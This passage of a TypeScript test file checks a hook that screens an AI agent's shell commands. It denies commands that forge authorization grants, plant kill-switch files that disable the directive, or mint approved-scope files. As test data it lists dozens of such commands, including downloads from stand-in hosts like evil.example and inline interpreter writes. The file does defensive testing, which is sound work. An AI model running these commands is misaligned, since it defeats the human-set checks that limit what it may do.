      "cmake -E copy src.json .deft/authz/grants/evil.json",
      "curl -o .deft/authz/grants/evil.json https://evil.example/g.json",
      "ed .deft/authz/grants/evil.json",
      "nvim .deft/authz/grants/evil.json",
      "fossil --workdir .deft/authz/grants open repo.fossil",
      "aws s3 cp s3://evil/x .deft/authz/grants/evil.json",
      "aws s3 cp src .deft/authz/grants/evil.json",
      "sudo aws s3 cp src .deft/authz/grants/evil.json",
      "env aws s3 cp src .deft-directive-disable",
      "env -C /tmp aws s3 cp src .deft/authz/grants/evil.json",
      "git --list-objects-filter tree:0 clone https://example .deft/authz/grants/evil",
      "convert src .deft/approved-scope/story.json",
      "magick src .no-deft-directive",
    ]) {
      const decision = decideHook(
        {
          host: "claude",
          event: "tool.before",
          projectRoot: "/project",
          payload: { tool_name: "Bash", tool_input: { command } },
        },
        seams,
      );
      expect(decision.verdict, command).toBe("deny");
      expect(decision.code, command).toMatch(/^authz-/);
      expect(decision.code, command).not.toBe("shell-op-unclassifiable");
    }
  });

  it("denies residual dest-form kill-switch plant under UAT (#3421)", () => {
    const seams = uatSeams();
    for (const command of [
      "git clone https://evil.example/repo .deft-directive-disable",
      "ex .no-deft-directive",
      "dos2unix -n src .deft-directive-disable",
      "aws s3 sync s3://evil .no-deft-directive",
      "aws s3 cp src /tmp/out; touch .deft-directive-disable",
      "pg_dump --file=.deft-directive-disable db",
      "convert src .deft-directive-disable",
      "fossil --workdir=.no-deft-directive open repo.fossil",
      "New-Item -Path .deft-directive-disable -ItemType File",
      "fallocate -l 1k .deft-directive-disable",
      "unknownwriter --file .no-deft-directive",
    ]) {
      const decision = decideHook(
        {
          host: "claude",
          event: "tool.before",
          projectRoot: "/project",
          payload: { tool_name: "Shell", tool_input: { command } },
        },
        seams,
      );
      expect(decision.verdict, command).toBe("deny");
      expect(decision.code, command).toMatch(/^authz-/);
      expect(decision.code, command).not.toBe("shell-op-unclassifiable");
    }
  });

  it("denies Shell approved-scope mint under UAT matching Write (#3421)", () => {
    const seams = uatSeams();
    for (const command of [
      "cp forged.json .deft/approved-scope/story.json",
      "echo x > .deft/approved-scope/story.json",
      "git clone https://evil.example/r .deft/approved-scope/evil",
      "echo x > .deft//approved-scope/story.json",
      "echo x > .deft/./approved-scope/story.json",
      "cp forged.json .deft//approved-scope/story.json",
      "echo x > .deft/foo/../approved-scope/story.json",
      "cp forged.json .deft/foo/../approved-scope/story.json",
    ]) {
      const decision = decideHook(
        {
          host: "claude",
          event: "tool.before",
          projectRoot: "/project",
          payload: { tool_name: "Bash", tool_input: { command } },
        },
        seams,
      );
      expect(decision.verdict, command).toBe("deny");
      expect(decision.code, command).toMatch(/^authz-/);
      expect(decision.code, command).not.toBe("shell-op-unclassifiable");
    }
    const writeDecision = decideHook(
      {
        host: "claude",
        event: "tool.before",
        projectRoot: "/project",
        payload: {
          tool_name: "Write",
          tool_input: { file_path: "/project/.deft/approved-scope/story.json" },
        },
      },
      seams,
    );
    expect(writeDecision.verdict).toBe("deny");
    expect(writeDecision.code).toMatch(/^authz-/);
  });

  it("still allows ordinary residual dest-form dest under UAT (non-authz) (#3421)", () => {
    const seams = uatSeams();
    for (const command of [
      "git clone https://example.com/repo /tmp/out",
      "git worktree add /tmp/out HEAD",
      "ex /tmp/out",
      "dos2unix -n src /tmp/out",
      "aws s3 sync s3://example /tmp/out",
      "pijul clone https://example.com/repo /tmp/out",
      "pg_dump -f /tmp/out db",
      "convert src /tmp/out",
      "fossil --workdir=/tmp/out open repo.fossil",
      "New-Item -Path /tmp/out -ItemType File",
      "fallocate -l 1k /tmp/out",
      "unknownwriter --workdir=/tmp/out",
      "grep -f .deft/authz/patterns.txt src.txt",
      "grep --file .deft/authz/patterns.txt src.txt",
      "Get-Content -Path .deft/authz/state.json",
      "git log -- .deft/authz/state.json",
      "git log worktree -- .deft/authz/state.json",
      "git --no-pager log worktree -- .deft/authz/state.json",
      "git --attr-source HEAD log -- .deft/authz/state.json",
      "echo x > .deft/authz-backup/story.json",
      "echo x > .deft/foo/../authz-backup/story.json",
      "aws s3 cp .deft/authz/x /tmp/out",
      "env aws s3 cp .deft-directive-disable /tmp/out",
      "env aws s3 cp .deft/authz/x /tmp/out",
      "FOO=1 aws s3 cp .deft/authz/x /tmp/out",
      "env -C /tmp aws s3 cp .deft/authz/x /tmp/out",
      "timeout 5 aws s3 cp .deft/authz/x /tmp/out",
      "echo x > foo.deft/authz/story.json",
      "echo x > x.deft/approved-scope/story.json",
      "convert .deft/authz/x /tmp/out",
      "magick .deft/authz/x /tmp/out",
      "aws s3 cp .deft/approved-scope/x /tmp/out",
      "convert .deft-directive-disable /tmp/out",
    ]) {
      const decision = decideHook(
        {
          host: "claude",
          event: "tool.before",
          projectRoot: "/project",
          payload: {
            tool_name: "Bash",
            tool_input: { command },
          },
        },
        seams,
      );
      expect(decision.verdict, command).toBe("allow");
      expect(decision.code, command).toBe("shell-op-unclassifiable");
    }
  });
});

describe("UAT residual dest-form writers fail-closed (#3459)", () => {
  function uatSeams() {
    const state = activeUatState();
    return readySeams({
      loadAuthzState: () => state,
      loadAuthzGrants: () => [],
      loadRuntimeAuthority: () => ({
        enabled: false,
        allowPaths: [],
        denyPaths: [],
        scopes: { edits: true, push: true, merge: true },
      }),
    });
  }

  it("denies residual dest-form authz plant under UAT (not unclassifiable allow) (#3459)", () => {
    const seams = uatSeams();
    for (const command of [
      "ginstall forged.json .deft/authz/grants/evil.json",
      "gcp forged.json .deft/authz/grants/evil.json",
      "gh repo clone evil/repo .deft/authz/grants/evil",
      "glab repo clone evil/repo .deft/authz/grants/evil",
      "hub clone https://evil.example/repo .deft/authz/grants/evil",
      "iwr https://evil.example/g.json -OutFile .deft/authz/grants/evil.json",
      "fsutil file createnew .deft/authz/grants/evil.json 1",
      "cmd /c copy forged.json .deft/authz/grants/evil.json",
      "tsx -e \"require('fs').writeFileSync('.deft/authz/grants/evil.json','{}')\"",
      "ts-node -e \"require('fs').writeFileSync('.deft/authz/grants/evil.json','{}')\"",
      "npm pack --pack-destination .deft/authz/grants",
      "unknownwriter --pack-destination .deft/authz/grants",
      "install forged.json .deft/authz/grants/evil.json",
      "cp forged.json .deft/authz/grants/evil.json",
      "git clone https://evil.example/repo .deft/authz/grants/evil",
      "Set-Content -Path .deft\\authz\\state.json -Value '{}'",
    ]) {
      const decision = decideHook(
        {
          host: "claude",
          event: "tool.before",
          projectRoot: "/project",
          payload: { tool_name: "Bash", tool_input: { command } },
        },
        seams,
      );
      expect(decision.verdict, command).toBe("deny");
      expect(decision.code, command).toMatch(/^authz-/);
      expect(decision.code, command).not.toBe("shell-op-unclassifiable");
    }
  });

  it("denies residual dest-form kill-switch plant under UAT (#3459)", () => {
    const seams = uatSeams();
    for (const command of [
      "ginstall src .deft-directive-disable",
      "gcp src .no-deft-directive",
      "gh repo clone evil/repo .deft-directive-disable",
      "iwr https://evil.example/x -OutFile .no-deft-directive",
      "fsutil file createnew .deft-directive-disable 1",
      "cmd /c copy src .deft-directive-disable",
      "npm pack --pack-destination .no-deft-directive",
    ]) {
      const decision = decideHook(
        {
          host: "claude",
          event: "tool.before",
          projectRoot: "/project",
          payload: { tool_name: "Shell", tool_input: { command } },
        },
        seams,
      );
      expect(decision.verdict, command).toBe("deny");
      expect(decision.code, command).toMatch(/^authz-/);
      expect(decision.code, command).not.toBe("shell-op-unclassifiable");
    }
  });

  it("denies Shell approved-scope mint under UAT matching Write (#3459)", () => {
    const seams = uatSeams();
    for (const command of [
      "ginstall forged.json .deft/approved-scope/story.json",
      "iwr https://evil.example/x -OutFile .deft/approved-scope/story.json",
      "tsx plant.ts .deft/approved-scope/story.json",
      "npm pack --pack-destination .deft/approved-scope",
      "touch .deft/approved-scope/story.json",
    ]) {
      const decision = decideHook(
        {
          host: "claude",
          event: "tool.before",
          projectRoot: "/project",
          payload: { tool_name: "Bash", tool_input: { command } },
        },
        seams,
      );
      expect(decision.verdict, command).toBe("deny");
      expect(decision.code, command).toMatch(/^authz-/);
      expect(decision.code, command).not.toBe("shell-op-unclassifiable");
    }
  });

  it("still allows ordinary residual dest-form dest under UAT (non-authz) (#3459)", () => {
    const seams = uatSeams();
    for (const command of [
      "ginstall forged.json /tmp/out",
      "gcp forged.json /tmp/out",
      "gh repo clone example/repo /tmp/out",
      "iwr https://example.com/x -OutFile /tmp/out",
      "fsutil file createnew /tmp/out 1",
      "cmd /c copy forged.json /tmp/out",
      "npm pack --pack-destination /tmp/out",
      'tsx -e "console.log(1)"',
      "touch /tmp/out",
      "gh repo view owner/repo",
    ]) {
      const decision = decideHook(
        {
          host: "claude",
          event: "tool.before",
          projectRoot: "/project",
          payload: {
            tool_name: "Bash",
            tool_input: { command },
          },
        },
        seams,
      );
      expect(decision.verdict, command).toBe("allow");
      expect(decision.code, command).toBe("shell-op-unclassifiable");
    }
  });

  it("denies residual dest-form authz plant under UAT after #3459 (not unclassifiable allow) (#3529)", () => {
    const seams = uatSeams();
    for (const command of [
      "xcopy forged.json .deft/authz/grants/evil.json",
      "robocopy src .deft/authz/grants",
      "move forged.json .deft/authz/grants/evil.json",
      "cmd /c xcopy forged.json .deft/authz/grants/evil.json",
      "Start-BitsTransfer -Destination .deft/authz/grants/evil.json",
      "Expand-Archive -DestinationPath .deft/authz/grants",
      "bun -e \"require('fs').writeFileSync('.deft/authz/grants/evil.json','{}')\"",
      "deno eval \"Deno.writeTextFileSync('.deft/authz/grants/evil.json','{}')\"",
      "php -r \"file_put_contents('.deft/authz/grants/evil.json','x')\"",
      "unknownwriter --output-dir .deft/authz/grants",
      "unknownwriter -Destination .deft/authz/grants/evil.json",
      "git bundle create .deft/authz/grants/evil.bundle HEAD",
      "sponge .deft/authz/grants/evil.json",
      "pscp host:g.json .deft/authz/grants/evil.json",
      "jj clone https://evil.example/repo .deft/authz/grants",
      "cmd /c copy forged.json .deft/authz/grants/evil.json",
      "ginstall forged.json .deft/authz/grants/evil.json",
      "tsx -e \"require('fs').writeFileSync('.deft/authz/grants/evil.json','{}')\"",
      "cp forged.json .deft/authz/grants/evil.json",
    ]) {
      const decision = decideHook(
        {
          host: "claude",
          event: "tool.before",
          projectRoot: "/project",
          payload: { tool_name: "Bash", tool_input: { command } },
        },
        seams,
      );
      expect(decision.verdict, command).toBe("deny");
      expect(decision.code, command).toMatch(/^authz-/);
      expect(decision.code, command).not.toBe("shell-op-unclassifiable");
    }
  });

  it("denies residual dest-form kill-switch plant under UAT after #3459 (#3529)", () => {
    const seams = uatSeams();
    for (const command of [
      "ren forged.json .deft-directive-disable",
      "xcopy src .deft-directive-disable",
      "bun -e \"require('fs').writeFileSync('.deft-directive-disable','')\"",
      "Rename-Item forged.json .no-deft-directive",
    ]) {
      const decision = decideHook(
        {
          host: "claude",
          event: "tool.before",
          projectRoot: "/project",
          payload: { tool_name: "Shell", tool_input: { command } },
        },
        seams,
      );
      expect(decision.verdict, command).toBe("deny");
      expect(decision.code, command).toMatch(/^authz-/);
      expect(decision.code, command).not.toBe("shell-op-unclassifiable");
    }
  });

  it("denies residual Shell approved-scope mint under UAT matching Write (#3529)", () => {
    const seams = uatSeams();
    for (const command of [
      "xcopy forged.json .deft/approved-scope/story.json",
      "Expand-Archive -DestinationPath .deft/approved-scope",
      "bun -e \"require('fs').writeFileSync('.deft/approved-scope/story.json','{}')\"",
    ]) {
      const decision = decideHook(
        {
          host: "claude",
          event: "tool.before",
          projectRoot: "/project",
          payload: { tool_name: "Bash", tool_input: { command } },
        },
        seams,
      );
      expect(decision.verdict, command).toBe("deny");
      expect(decision.code, command).toMatch(/^authz-/);
      expect(decision.code, command).not.toBe("shell-op-unclassifiable");
    }
  });

  it("still allows ordinary residual dest-form dest under UAT after #3459 (non-authz) (#3529)", () => {
    const seams = uatSeams();
    for (const command of [
      "xcopy forged.json /tmp/out",
      "robocopy src /tmp/out",
      "move forged.json /tmp/out",
      "unknownwriter --output-dir /tmp/out",
      "jj clone https://example.com/repo /tmp/out",
      'bun -e "console.log(1)"',
      "php -r 'echo 1;'",
    ]) {
      const decision = decideHook(
        {
          host: "claude",
          event: "tool.before",
          projectRoot: "/project",
          payload: {
            tool_name: "Bash",
            tool_input: { command },
          },
        },
        seams,
      );
      expect(decision.verdict, command).toBe("allow");
      expect(decision.code, command).toBe("shell-op-unclassifiable");
    }
  });
});

describe("UAT residual dest-form writers fail-closed (#3545)", () => {
  function uatSeams() {
    const state = activeUatState();
    return readySeams({
      loadAuthzState: () => state,
      loadAuthzGrants: () => [],
      loadRuntimeAuthority: () => ({
        enabled: false,
        allowPaths: [],
        denyPaths: [],
        scopes: { edits: true, push: true, merge: true },
      }),
    });
  }

  it("denies residual dest-form authz plant under UAT after #3529 (not unclassifiable allow) (#3545)", () => {
    const seams = uatSeams();
    for (const command of [
      "ruby3.3 -e \"File.write('.deft/authz/grants/evil.json','{}')\"",
      "jruby -e \"File.write('.deft/authz/grants/evil.json','{}')\"",
      "pypy3 -c \"open('.deft/authz/grants/evil.json','w').write('{}')\"",
      "perl -e \"write_file('.deft/authz/grants/evil.json','{}')\"",
      "perl -e \"path('.deft/authz/grants/evil.json')->spew('{}')\"",
      "perl -e \"open F,'>','.deft/authz/grants/evil.json'\"",
      "make DESTDIR=.deft/authz/grants install",
      "env DESTDIR=.deft/authz/grants make install",
      "sudo make DESTDIR=.deft/authz/grants install",
      "timeout 5 make DESTDIR=.deft/authz/grants install",
      "xargs make DESTDIR=.deft/authz/grants install",
      "make DESTDIR=.deft/authz/grants clean install",
      "dpkg -x pkg.deb .deft/authz/grants",
      "fromdos .deft/authz/grants/evil.json",
      "emacsclient .deft/authz/grants/evil.json",
      "pico .deft/authz/grants/evil.json",
      "pdftk in.pdf output .deft/authz/grants/evil.pdf",
      "gs -sOutputFile=.deft/authz/grants/evil.pdf",
      "npx degit user/repo .deft/authz/grants",
      "composer create-project pkg .deft/authz/grants",
      "ddrescue src .deft/authz/grants/evil.json",
      "dc3dd if=src of=.deft/authz/grants/evil.json",
      "sg_dd if=src of=.deft/authz/grants/evil.json",
      "darcs --repodir=.deft/authz/grants init",
      "unknownwriter --repodir .deft/authz/grants",
      "ruby -e \"File.write('.deft/authz/grants/evil.json','{}')\"",
      "python3 -c \"open('.deft/authz/grants/evil.json','w').write('{}')\"",
      "dpkg-deb -x pkg.deb .deft/authz/grants",
      "xcopy forged.json .deft/authz/grants/evil.json",
      "cp forged.json .deft/authz/grants/evil.json",
    ]) {
      const decision = decideHook(
        {
          host: "claude",
          event: "tool.before",
          projectRoot: "/project",
          payload: { tool_name: "Bash", tool_input: { command } },
        },
        seams,
      );
      expect(decision.verdict, command).toBe("deny");
      expect(decision.code, command).toMatch(/^authz-/);
      expect(decision.code, command).not.toBe("shell-op-unclassifiable");
    }
  });

  it("denies residual dest-form kill-switch plant under UAT after #3529 (#3545)", () => {
    const seams = uatSeams();
    for (const command of [
      "ruby3.3 -e \"File.write('.deft-directive-disable','')\"",
      "pypy3 -c \"open('.no-deft-directive','w').write('')\"",
      "jruby -e \"File.write('.deft-directive-disable','')\"",
      "fromdos .deft-directive-disable",
      "emacsclient .deft-directive-disable",
      "pico .no-deft-directive",
      "ddrescue src .deft-directive-disable",
      "dc3dd if=src of=.no-deft-directive",
      "npx degit user/repo .deft-directive-disable",
    ]) {
      const decision = decideHook(
        {
          host: "claude",
          event: "tool.before",
          projectRoot: "/project",
          payload: { tool_name: "Shell", tool_input: { command } },
        },
        seams,
      );
      expect(decision.verdict, command).toBe("deny");
      expect(decision.code, command).toMatch(/^authz-/);
      expect(decision.code, command).not.toBe("shell-op-unclassifiable");
    }
  });

  it("denies residual Shell approved-scope mint under UAT matching Write (#3545)", () => {
    const seams = uatSeams();
    for (const command of [
      "ruby3.3 -e \"File.write('.deft/approved-scope/story.json','{}')\"",
      "fromdos .deft/approved-scope/story.json",
      "npx degit user/repo .deft/approved-scope",
      "make DESTDIR=.deft/approved-scope install",
      "darcs --repodir=.deft/approved-scope init",
    ]) {
      const decision = decideHook(
        {
          host: "claude",
          event: "tool.before",
          projectRoot: "/project",
          payload: { tool_name: "Bash", tool_input: { command } },
        },
        seams,
      );
      expect(decision.verdict, command).toBe("deny");
      expect(decision.code, command).toMatch(/^authz-/);
      expect(decision.code, command).not.toBe("shell-op-unclassifiable");
    }
  });

  it("still allows ordinary residual dest-form dest under UAT after #3529 (non-authz) (#3545)", () => {
    const seams = uatSeams();
    for (const command of [
      "fromdos /tmp/out",
      "todos /tmp/out",
      "emacsclient /tmp/out",
      "pico /tmp/out",
      "dpkg -x pkg.deb /tmp/out",
      "make DESTDIR=/tmp/out install",
      "npx degit user/repo /tmp/out",
      "composer create-project pkg /tmp/out",
      "ddrescue src /tmp/out",
      "darcs --repodir=/tmp/out init",
      "unknownwriter --repodir /tmp/out",
      'ruby3.3 -e "puts 1"',
      'pypy3 -c "print(1)"',
      "perl -e 'print 1;'",
      "echo DESTDIR=.deft/authz/grants",
      "true PREFIX=.deft/approved-scope",
      "echo DESTDIR=.deft/authz/grants make",
      "make DESTDIR=.deft/authz/grants clean",
      "make DESTDIR=.deft/authz/grants distclean",
      "make DESTDIR=.deft/authz/grants check",
      "git log make DESTDIR=.deft/authz/grants",
    ]) {
      const decision = decideHook(
        {
          host: "claude",
          event: "tool.before",
          projectRoot: "/project",
          payload: {
            tool_name: "Bash",
            tool_input: { command },
          },
        },
        seams,
      );
      expect(decision.verdict, command).toBe("allow");
      expect(decision.code, command).toBe("shell-op-unclassifiable");
    }
  });
});
